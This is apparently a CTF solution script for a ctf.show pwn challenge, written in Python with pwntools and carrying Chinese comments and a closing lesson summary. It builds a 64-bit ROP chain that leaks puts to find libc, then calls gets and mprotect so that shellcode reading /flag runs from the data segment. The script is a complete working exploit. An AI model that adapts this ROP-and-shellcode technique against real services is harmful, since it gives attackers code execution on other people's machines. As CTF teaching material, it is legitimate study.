from pwn import *
from LibcSearcher import *

context(log_level='debug', arch='amd64', os='linux')

io = remote("pwn.challenge.ctf.show", 28199)
elf = ELF('./pwn')

# ret = 0x400640：ret指令的地址，用于栈对齐
ret = 0x400640

# pop_rdi_ret = 0x401ba3：pop rdi; ret gadget的地址，用于给rdi寄存器赋值
pop_rdi_ret = 0x401ba3

# puts_plt = elf.plt['puts']：puts函数的PLT表地址
puts_plt = elf.plt['puts']

# puts_got = elf.got['puts']：puts函数的GOT表地址
puts_got = elf.got['puts']

# main_ret = elf.sym['main']：main函数的地址，用于返回main函数继续执行
main_ret = elf.sym['main']

# data = 0x603000：数据段地址，用于存储shellcode
data = 0x603000

# 等待提示信息
io.recvuntil(b">> ")

# 构造第一次payload，用于泄露puts函数的地址
# b"A"*0x418：填充垃圾数据到返回地址
# p64(0x28)：可能是padding
# p64(pop_rdi_ret)：执行pop rdi; ret，将puts_got弹出到rdi
# p64(puts_got)：puts函数的GOT表地址，作为puts的参数
# p64(puts_plt)：调用puts函数，打印puts的GOT表内容
# p64(main_ret)：puts返回后跳回main函数
payload = b"A"*0x418 + p64(0x28) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_ret)
io.sendline(payload)

# 接收并解析泄露的puts函数地址
puts_addr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))

# 使用LibcSearcher根据puts地址查找libc版本
libc = LibcSearcher("puts", puts_addr)

# 计算libc基址
libc_base = puts_addr - libc.dump("puts")

# 计算mprotect函数的地址
mprotect_addr = libc_base + libc.dump("mprotect")

# 计算pop rdx gadget的地址
pop_rdx = libc_base + 0x1b96

# 计算pop rsi gadget的地址
pop_rsi = libc_base + 0x236ea

# 计算gets函数的地址
gets_addr = libc_base + libc.dump("gets")

print("libc_base:", hex(libc_base))

# 等待提示信息
io.recvuntil(b">> ")

# 构造第二次payload，用于设置内存可执行并读取shellcode
# b"A"*0x418：填充垃圾数据到返回地址
# p64(0x28)：padding
# p64(pop_rdi_ret) + p64(data)：设置rdi为data地址（mprotect的第一个参数）
# p64(gets_addr) + p64(pop_rdi_ret) + p64(data)：调用gets函数，读取shellcode到data地址
# p64(pop_rsi) + p64(0x1000) + p64(pop_rdx)：设置rsi为0x1000（mprotect的第二个参数），rdx为7（mprotect的第三个参数，PROT_READ|PROT_WRITE|PROT_EXEC）
# p64(7) + p64(mprotect_addr) + p64(data)：调用mprotect设置data地址为可执行，然后跳转到data地址执行shellcode
payload = b"A"*0x418 + p64(0x28) + p64(pop_rdi_ret) + p64(data)
payload += p64(gets_addr) + p64(pop_rdi_ret) + p64(data)
payload += p64(pop_rsi) + p64(0x1000) + p64(pop_rdx)
payload += p64(7) + p64(mprotect_addr) + p64(data)
io.sendline(payload)

# 生成读取flag的shellcode
getflag = asm(shellcraft.cat("/flag"))

# 发送shellcode
io.sendline(getflag)
io.interactive()

"""
【知识点讲解】
1. 题目类型：ROP - 64位ROP链 + mprotect + shellcode
2. 核心原理：
   - 首先泄露puts函数的地址，计算libc基址
   - 然后构造ROP链，调用mprotect设置内存可执行
   - 调用gets读取shellcode到可执行内存
   - 执行shellcode读取flag
3. 关键步骤：
   - 泄露puts地址：payload1 = padding + pop_rdi + puts_got + puts_plt + main
   - 计算libc基址：libc_base = puts_addr - libc.dump("puts")
   - 构造mprotect ROP链：设置内存权限为可读可写可执行
   - 读取并执行shellcode：调用gets读取shellcode，然后跳转到执行
4. 技术要点：
   - 64位ROP链构造
   - mprotect函数的使用（设置内存权限）
   - shellcode的生成和执行
   - LibcSearcher的使用
"""
